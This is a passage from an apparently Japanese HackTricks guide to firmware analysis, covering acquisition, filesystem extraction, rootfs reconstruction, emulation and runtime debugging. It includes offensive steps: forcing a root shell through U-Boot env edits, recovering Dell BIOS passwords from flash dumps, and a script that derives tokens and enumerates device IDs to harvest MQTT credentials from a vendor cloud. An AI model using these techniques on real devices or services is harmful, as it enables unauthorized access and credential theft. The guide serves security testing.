# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

公開されているハードウェアインターフェースから取得する方法については、[UARTコンソールを使ったファームウェアのダンプ](../hardware-hacking/uart.md#dumping-firmware-with-uart-console)および[SPI flashのダンプ](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)を参照してください。コンソールにアクセスする前に、起動時のUARTキャプチャを繰り返し取得する方法については、[SCPI制御による電源およびオシロスコープを使った取得](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)を参照してください。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・仲介し、デバイスが正しく動作するために不可欠なソフトウェアです。ファームウェアは不揮発性メモリに保存されるため、デバイスの電源投入直後から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するうえで、ファームウェアの調査や変更は重要なステップです。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を把握するための重要な初期ステップです。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行されるオペレーティングシステム
- ブートローダーの詳細
- ハードウェア構成とデータシート
- コードベースの指標とソースの場所
- 外部ライブラリとライセンスの種類
- 更新履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**オープンソースインテリジェンス（OSINT）**ツールが非常に有用です。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動でレビューし、分析することも役立ちます。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのツールでは、潜在的な問題を見つけるために無料の静的解析を利用できます。

## **ファームウェアの取得**

ファームウェアは、複雑さの異なるさまざまな方法で取得できます。

- 開発者やメーカーなどの提供元から**直接入手**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- **Google dork**クエリを使って、ホストされているファームウェアファイルを探す
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのツールを使い、**cloud storage**に直接アクセスする
- man-in-the-middle手法で**更新を傍受**する
- **UART**、**JTAG**、**PICit**などの接続を使って、デバイスから**抽出**する
- デバイスとの通信を監視し、更新リクエストを**スニッフィング**する
- **ハードコードされた更新エンドポイント**を特定して利用する
- ブートローダーまたはネットワークから**ダンプ**する
- 他の方法が使えない場合は、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTログのみの場合：flash内のU-Boot envを使ってroot shellを強制する

UART RXが無視される場合（ログのみの場合）でも、オフラインで**U-Boot環境変数のblobを編集**すれば、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプします。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を追加し、blobの**U-Boot env CRC32を再計算**します。
3. env partitionのみを書き換えて再起動すると、UART上にshellが表示されます。

これは、bootloader shellが無効になっている一方、外部flashアクセスでenv partitionを書き換えられる組み込みデバイスで役立ちます。

## ファームウェアの解析

**ファームウェアを入手した**ので、その扱い方を判断するために情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いでしょう。高ければ、暗号化されている可能性が高いです（または何らかの方法で圧縮されています）。

さらに、以下のツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) でファイルを調べることもできます。

### 外部フラッシュ内の生ディスプレイアセット

外部SPIダンプが、必ずしもMCUの実行可能なファームウェアとは限りません。Cortex-Mを対象とする場合は、コード候補領域の先頭をデバイスのメモリマップと照合してください。通常のベクタテーブルは、妥当なSRAMスタックポインタと、実行可能メモリ内のリセットハンドラアドレスから始まります。オフセット0にベクタテーブルがないことだけでは、チップ全体にコードがないとは判断できません。他のオフセットやブート構成も調べてください。`binwalk` でコンテナが見つからない場合は、生バイト列を調べ、[decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) から得たフラッシュ読み取りアドレスと、新しい画面を読み込む操作を関連付けてください。<sup>[[14]](#references)</sup>

ディスプレイアセット領域では、PNG/JPEGと決めつけず、候補となるピクセル形式と寸法を試してください。引用したデバイスでは**80×160 RGB565 little-endian**のフレームが使われていました。1ピクセルあたり2バイトなので、1フレームは**25,600バイト**（25 KiB）であり、24キロビットではありません。デコードしたフラッシュ読み取りアドレスから画面アセットのオフセットを特定し、研究者は準備した画像を `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` で変換し、元のダンプ内で同じサイズのアセットと置き換え、`flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` で書き込み、新しい画像がディスプレイに表示されることを確認しました。これは書き換え可能な*外部ディスプレイアセット*を示すものであり、MCUの内部ファームウェアの抽出や再フラッシュを示すものではありません。書き込みを行う前に、元のダンプを保管し、寸法、バイト順、オフセット、置換データの長さを確認してください。<sup>[[14]](#references)</sup>

### 差分フラッシュ解析と復元可能なXOR秘密情報ストア

ファームウェア設定の保存形式が文書化されていない場合は、まず一致するフラッシュ読み取りを複数回行い、設定を**1つだけ**変更してから、チップ全体を再度ダンプし、オフセットを比較してください。値を管理してこの実験を繰り返せば、設定値とカウンタや書き込みメタデータを区別できます。データが同じ場所ではなく新しいオフセットに書き込まれる場合、追記専用またはログ構造化されたストアであることを示しています。削除済みまたはトゥームストーン化されたエントリも残してください。ペイロードのバイト列を復元できる場合があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk`などのツールでファームウェアモジュールを抽出し、Ghidraでwriter/validatorをリバースエンジニアリングします。暗号文のパターンだけから方式を推測するのではなく、コードでフィールド境界、パディング、鍵のインデックス付け、鍵導出を確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロパディングから鍵を復元する

[ XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)で説明されているように、既知平文から同じオフセットのキーストリームバイトが判明します。固定サイズのフィールドでは、ゼロパディングが繰り返しXOR鍵のすべてのインデックスにまたがる場合、とりわけ情報が漏れやすくなります。`0x00 XOR key_byte = key_byte`であるため、暗号化されたパディングから鍵のバイトを直接読み取れます。鍵のすべてのインデックスがカバーされていれば、暗号文の末尾から鍵を復元し、データが格納されたバイトを復号できます。<sup>[[12]](#references)</sup>

Dellの脆弱なDVAR BIOSパスワード形式は、その具体例です。32バイトフィールドのバイト`0`は平文で、バイト`1..31`は20バイト鍵を繰り返し使って暗号化されます。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワード長が `L` の場合、XOR 前の位置 `L..31` はゼロでした。`L <= 12` であれば、これらの位置がすべてのキーインデックスをカバーするため、ブルートフォースなしでキーとパスワード全体を復元できます。<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 履歴レコードからキーを取り出す

各レコードを個別に解析しないでください。DVAR key はおおよそ `modified_md5(device_seed || variable_GUID || password[0])` として導出されます。device seed と GUID は固定されており、パスワードに依存する入力は平文の先頭バイトだけです。つまり、デバイスごとのキーは最大 256 個で、同じバイトで始まるレコードは同じキーを共有します。active と deleted のレコードをそのバイトごとにグループ化してください。短い履歴レコードは、パディングを通じて完全なキーを leak し、それ自体のパディングでは不十分な、より長い現在のレコードを復号できる場合があります。そのため、古い暗号文を消去せず tombstone 化すると、パスワードのローテーションによって露出が増える可能性があります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) ツールは DVAR を特定し、候補レコードを検証し、パスワードを復元して、保存されたデータやキーの生バイトを表示できます。checkout からビルドし、検証済みの flash image を次のようにスキャンします。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングのチェック、鍵のエントロピー、鍵が折り返される箇所での一貫性を使って誤検出を排除してください。複数回のdumpで書き込みごとのビット反転がまばらに見られる場合は、観測されたマスクを列挙し、これらの制約に基づいて修正候補を順位付けしてください。ただし、曖昧な文字はヒューリスティックな結果を正確な復元結果として提示せず、曖昧であると報告してください。<sup>[[12]](#references)</sup>

Password verifierには、復号可能な暗号文ではなく、saltを付加して反復処理した一方向hashを保存してください。また、ログ構造型ストアでは、置き換えられた秘密情報を安全に削除してください。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

前述のコメント付きツール（`binwalk -ev <bin>` など）を使えば、**ファイルシステムを抽出**できているはずです。\
通常、binwalkはファイルシステムの種類にちなんだ**名前のフォルダー**内に抽出します。一般的な種類は次のとおりです: squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### ファイルシステムの手動抽出

binwalkのシグネチャにファイルシステムの**マジックバイトが含まれていない**場合があります。その場合は、binwalkで**ファイルシステムのオフセットを特定し、圧縮されたファイルシステムをバイナリから切り出して**、以下の手順に従い、種類に応じてファイルシステムを**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

以下の **dd command** を実行して Squashfs ファイルシステムを carve します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは"`squashfs-root`"ディレクトリに格納されます。

- CPIOアーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NANDフラッシュを使用するubifsファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込みルートファイルシステムの再構築

raw eMMC/SSDダンプに有効なファイルシステムヘッダーが含まれている一方で、メタデータのオフセットが公称パーティションの範囲を超えている場合、すぐに破損していると判断しないでください。組み込みのブートコードはDevice Mapperを使って複数の物理範囲から実際のルートデバイスを組み立てることがあるため、GPTパーティションを1つだけ切り出しても、最初のセグメントしか得られません。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得処理が完了していること、サイズが安定していること、イメージを保持している書き込みプロセスがないことを確認します。ファイル名に開始アドレスと終了アドレスが含まれている場合は、その範囲を実際のバイト数と照合します。GPTを読み取り専用モードで復元し、必要な範囲のみをアタッチしてください。ワークステーション上で信頼できない物理ボリュームに対して`vgchange -ay`を実行してはいけません。ボリュームグループの衝突や意図しない書き込みが発生する可能性があります。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init ロジックまたは LVM stack がイメージ全体を認識する必要がある場合は、使い捨ての VM を使用してください。標準の boot partition に残された過去の boot ログは特に有用です。bootloader が proprietary container のオフセット、コンポーネントの長さ、slot の選択、alignment ルール、signature verification を記録している場合があります。これらの値を使って、埋め込まれた command line/kernel/initramfs を切り出し、各出力を `file`、magic bytes、`binwalk` で個別に検証してください。container の末尾まで読み込むと、initrd、ACPI object、signature が誤って kernel に追加されることがあります。<sup>[[9]](#references)</sup>

#### boot 時の block map を復元する

kernel の initramfs を抽出し、その `/init` とストレージライブラリをリバースエンジニアリングします。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、partition path への文字列参照をたどり、次に active な A/B slot を選択して table を構築するコードを追跡します。radare2 の開始点として、`r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` が役立ちます。<sup>[[9]](#references)</sup>

linear target は、仮想デバイスの連続した範囲を、1 つ以上の backing device の範囲に対応付けます。復元された 2 セグメントの table は、一般に次の形式になります（位置と長さはすべて 512-byte sector 単位です）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

機械語の演算を、整数幅、シフト、単位変換も含めて正確に再現してください。たとえば、次の式はバイト単位のサイズをまず4 KiB境界に切り下げ、その後で512バイトセクターに変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

テーブル順に範囲をコピーし、チャンクサイズに上限を設けて、フラットな解析用イメージを再構成します。メディアダンプ全体をメモリに読み込まずに済みます。また、ホスト側の mapper デバイスを作成する必要もありません。GPT から導出したオフセット、反転したセクター数、結果の出力長は、それぞれ別個のアサーションとして保持してください。<sup>[[9]](#references)</sup>

#### 破損と一貫した再構成エラーを区別する

SquashFS では、`unsquashfs` を実行する前に、`hsqs` マジックを確認し、スーパーブロックのオフセット 40 にあるリトルエンディアンの 64 ビット `bytes_used` フィールドをデコードします。複数の無関係な構造で展開に失敗する場合は、想定位置の前後の広い範囲を検索し、強い構造上の候補を必須とします。たとえば、展開可能なメタデータブロック、連続する複数の有効なディレクトリエントリ、妥当な inode フィールド、inode 数と整合するルート inode、有効な整合性メタデータ構造などです。マジックが一つ一致するだけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ signed delta によって独立した構造（たとえばディレクトリのメタデータと verity レコード）が有効になる場合、原因として考えられるのは、バイト欠落ではなく、体系的なセグメント開始位置のずれです。孤立ファイルの復旧やファイルシステムのメタデータのパッチを試みる前に、符号を反転した計算に戻り、切り捨てられた余り、符号の扱い、オーバーフロー、セクターやページ単位の丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護の境界を混同しないでください。TPMで鍵を封印したLUKSボリュームはデータの機密性を保護し、署名付きのdm-verityマッピングはルートファイルシステムの完全性を保護します。ソフトウェアTPMでは、元の物理TPMに封印された鍵を復元できません。また、verity検証を省略する研究専用のinitを使って改変したSquashFSを起動しても、署名を偽造したりdm-verityを破ったりすることにはなりません。<sup>[[9]](#references)</sup>

## ファームウェアの解析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために、ファームウェアを詳しく調べることが重要です。この作業では、さまざまなツールを使ってファームウェアイメージを解析し、有用なデータを抽出します。

### 初期解析ツール

バイナリファイル（`<bin>`と表記）を最初に調べるための一連のコマンドを紹介します。これらのコマンドは、ファイルの種類の特定、文字列の抽出、バイナリデータの解析、パーティションとファイルシステムの詳細の把握に役立ちます：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使って**エントロピー**を確認します。エントロピーが低ければ暗号化されていない可能性が高く、エントロピーが高ければ暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類にちなんだ名前のディレクトリ（例: squashfs、ubifs）に抽出されます。ただし、magic bytes がないために **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。その場合、`binwalk` でファイルシステムのオフセットを特定し、続いて `dd` コマンドでファイルシステムを切り出します：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するための異なるコマンドを使用します。

### ファイルシステムの分析

ファイルシステムを抽出したら、セキュリティ上の欠陥を探し始めます。安全でないネットワークデーモン、ハードコードされた認証情報、API エンドポイント、更新サーバーの機能、未コンパイルのコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注目します。

確認すべき**主な場所**と**項目**は次のとおりです。

- ユーザー認証情報が含まれる **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL 証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析の対象となる組み込みバイナリ
- IoT デバイスで一般的な Web サーバーとバイナリ

ファイルシステム内の機密情報や脆弱性を見つけるには、いくつかのツールが役立ちます。

- 機密情報の検索には [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア分析には [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析には [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unix バイナリ用の **checksec.sh** や Windows バイナリ用の **PESecurity** などのツールを使うと、悪用される可能性のある保護されていないバイナリを特定できます。

## URL トークンから cloud config と MQTT 認証情報を取得する

多くの IoT ハブは、次のような cloud endpoint からデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析中に、`<token>` がハードコードされた秘密鍵を使い、デバイス ID からローカルで導出されていることが判明する場合があります。例:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知る者なら誰でも URL を再構成して cloud config を取得でき、そこから平文の MQTT 認証情報やトピックのプレフィックスが見つかることもよくあります。

実践的な手順:

1) UART の起動ログから deviceId を抽出する

- 3.3V UART アダプター（TX/RX/GND）を接続し、ログを取得します:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- クラウド設定 URL のパターンとブローカーアドレスを出力している行を探します。例:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) ファームウェアから STATIC_KEY と token のアルゴリズムを復元する

- バイナリを Ghidra/radare2 に読み込み、設定パス（"/pf/"）または MD5 の使用箇所を検索する。
- アルゴリズム（例：MD5(deviceId||STATIC_KEY)）を確認する。
- Bash で token を導出し、ダイジェストを大文字にする：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) クラウド設定と MQTT 認証情報を収集

- URL を組み立てて curl で JSON を取得し、jq で解析してシークレットを抽出します。

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACL（存在する場合）を悪用する

- 復元した認証情報を使用してメンテナンス topic を subscribe し、機密性の高いイベントを探す:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能な device ID を列挙する（大規模に行う場合は許可を得る）

- 多くのエコシステムでは、vendor OUI/product/type の bytes の後に連番の suffix が埋め込まれています。
- 候補 ID を順に試し、token を導出して、設定をプログラムで取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大規模な列挙を試みる前に、必ず明示的な許可を得てください。
- 可能であれば、対象ハードウェアを変更せずに秘密情報を復元するため、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレートすることで、デバイスの動作や個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題になることがありますが、ルートファイルシステムや特定のバイナリを、Raspberry Piなどアーキテクチャとエンディアンが一致するデバイス、または構築済みの仮想マシンに移すことで、さらにテストを進められます。

### 個々のバイナリのエミュレーション

単一のプログラムを調べる場合は、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用します。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARMアーキテクチャのエミュレーション

ARMバイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### システム全体のエミュレーション

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションが容易になり、プロセスを自動化して動的解析を支援できます。

### エミュレーション用に分割された検証済みルートファイルシステムを再構築する

SquashFSのスーパーブロックは読み取れるものの、inode、ディレクトリ、フラグメントテーブルのオフセットが不可能な値である場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、そこで作成されるブロックデバイスのグラフを再現してください。組み込みシステムでは、ルートパーティションとして認識される領域があっても、別のパーティションから借りたセクターを追加する `dm-linear` マッピングによって実際のファイルシステムを構成している場合があります。スーパーブロックだけの検査は成功しても、その後のメタデータブロックがすべてずれている可能性があります。<sup>[[11]](#references)</sup>

ファームウェアの算術処理を正確に再現してください。特に、長さの単位がバイト、512バイトセクター、4 KiBページのどれなのかを特定し、シフトと切り捨てを元の順序どおりに再現し、A/Bレイアウトでバンクによって異なる末尾領域も考慮してください。たとえば `(partition_bytes >> 12) << 3` は、まず4 KiB境界まで切り捨ててから、512バイトセクター単位の値に変換します。これを `partition_bytes // 512` に置き換えると、追加される領域の開始位置が数キロバイトずれ、後続のSquashFSテーブルがすべて破損する可能性があります。<sup>[[11]](#references)</sup>

次の検証手順が有効です。<sup>[[11]](#references)</sup>

1. 検証/initバイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクター、長さを特定します。
2. アラインメントの扱いを変えずに、各領域を連結するかマッピングします。
3. 抽出に失敗する場合は、予測した境界の前後の小さな範囲だけを検索し、妥当なスーパーブロックだけで判断せず、連続して複数の有効なメタデータ構造があることを確認します。
4. 再構築したイメージに未変更の `unsquashfs` を実行します。すべてのディレクトリとフラグメントを正常に辿れることは、`unsquashfs -stat` より強い証拠になります。

#### 解析者が制御するdm-verityの置き換え

解析者がQEMUカーネル、initramfs、仮想ディスクを制御できる場合、ベンダーの検証用PID 1を小さな静的リンク済みinitに置き換えることで、変更したルートを起動できます。これは**ラボでのブートチェーン置き換え**であり、dm-verity、RSA署名、Secure Boot、TPMで封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換え用initでは、元のブート手順の動作上必要な部分を再現してください。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプター0～2に接続し、`/proc` と `/sys` をマウントします。次に、指定されたブロックデバイスを待ち、編集したルートを読み取り専用でマウントし、古いルートの疑似ファイルシステムを切り離してから、新しいマウントを `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` します。`MS_MOVE` の前に `/dev`、`/proc`、`/sys` を切り離すことで、新しいルートに属するマウントポイントを誤って切り離すのを防げます。<sup>[[11]](#references)</sup>

変更した不変ルートとは別に、変更可能なデバイス状態を保持してください。qcow2オーバーレイで元のディスクのLVM状態を維持し、2台目の読み取り専用virtioディスクで編集済みのSquashFSを提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインでのイメージ状態のデバッグ

起動が遅い、破壊的な起動スクリプトが実行される、またはコンソールログが不安定で障害の原因が分かりにくい場合は、ゲストの外部から永続状態を調査します。実行中のVMが使用しているオーバーレイは決して接続しないでください。`qemu-nbd`で公開し、LVMの検出対象を目的のNBDパーティションに限定してから、切断前にボリュームグループを非アクティブ化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現性のある障害切り分けを行うには、書き込み可能な安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで検証してください。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了によって偽陰性が発生する可能性があります。また、無関係なコードを変更する前に、各レイヤー間のインターフェースが正確に一致するか比較してください。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` の世代と DRI driver ABI、PCI から導出される driver 名を比較します。コンポーネントが存在し、`dlopen()` に成功していても、利用側が異なる ABI を想定しているために使用できないことがあります。<sup>[[11]](#references)</sup>

## 実践的な動的解析

この段階では、実機またはエミュレートされたデバイス環境を使って解析します。OS とファイルシステムへの shell アクセスを維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があり、そのためエミュレーションを再起動しなければならないこともあります。解析では、ファイルシステムを再確認し、公開されているWebページやネットワークサービスをexploitし、bootloaderの脆弱性を調査します。潜在的なバックドアの脆弱性を特定するには、ファームウェアの完全性テストが重要です。

## ランタイム解析手法

ランタイム解析では、gdb-multiarch、Frida、Ghidraなどのツールを使い、実行環境内のプロセスやバイナリを調べます。ブレークポイントを設定し、fuzzingなどの手法で脆弱性を特定します。

完全なdebuggerを使えない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピーして、リモートから接続します**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT ハブでは、RF スタックが**radio MCU**と Linux のユーザーランドプロセスに分割されていることがよくあります。有用なワークフローは、次の経路をマッピングすることです:<sup>[[8]](#references)</sup>

1. 空中の**RF frame**
2. radio MCU 上の**controller-side parser**
3. Linux に転送される**serial/UART text または TLV protocol**（例: `/dev/tty*`）
4. メイン daemon 内の**application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、解析対象が1つではなく2つになります。controller がバイナリの radio frame を `Group,Command,arg1,arg2,...` のようなテキスト protocol に変換している場合は、次の情報を特定します。

